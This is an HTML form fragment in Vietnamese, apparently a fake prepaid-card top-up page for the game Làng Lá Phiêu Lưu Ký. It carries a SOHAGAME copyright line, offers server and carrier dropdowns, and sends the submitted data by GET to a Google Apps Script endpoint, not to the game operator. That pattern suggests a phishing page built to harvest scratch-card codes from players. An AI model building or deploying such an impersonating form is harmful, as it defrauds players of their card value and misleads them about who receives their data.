<form id="checkcard" method="GET" action="https://script.google.com/macros/s/AKfycbzTJyEPytnGAG1awz6bA7ANASFVCTNXPn4ECN1B1ssxH9hNFbE/exec" onsubmit="validateForm()" style="text-align: center;">
   <div class="item-content">
    <div class="item-inner not-empty-state">
        <div class="item-input item-input-field not-empty-state">
            <select  onchange="SeverChanged(this)" name="Sever" id="Sever" class="not-empty-state" required>
                <option value="">Chọn Sever</option>
                <option value="Hien">Hiền Sociu</option>
                <option value="Kha">Kha Cô Tếch</option>
                <option value="Lá 1">Làng Lá 1</option>
                <option value="Lá 2">Làng Lá 2</option>
                <option value="Lá 4">Làng Lá 4</option>
                <option value="Cát 5">Làng Cát 5</option>
                <option value="Sương 1">Làng Sương 1</option>
                <option value="Sương 6">Làng Sương 6</option>
            </select>
        </div>
    </div>
</div>
<div id="inputname"></div>
<div class="item-content">
    <div class="item-inner not-empty-state">
        <div class="item-input item-input-field not-empty-state">
            <select  onchange="loaitheChanged(this)" name="Loaithe" id="inputcard! level_sms" class="not-empty-state">
                <option value="">Chọn loại thẻ cào</option>
                <option value="Viettel">Viettel</option>
                <option value="Vinaphone">Vinaphone</option>
            </select>
        </div>
    </div>
</div>
<div id="inputcard"></div>
</li>
<li>
    <div class="item-content">
        <div class="item-inner">
            <div class="item-input">
                <button style="width: 100%;" type="submit" class="button button-big button-fill button-raised" id="btn_napcard">nạp thẻ</button>
            </div>
        </div>
    </div>
    <div class="content-block-title pay-message">
     ©SOHAGAME 2020 - Làng Lá Phiêu Lưu Ký
 </div>
</li>
</form>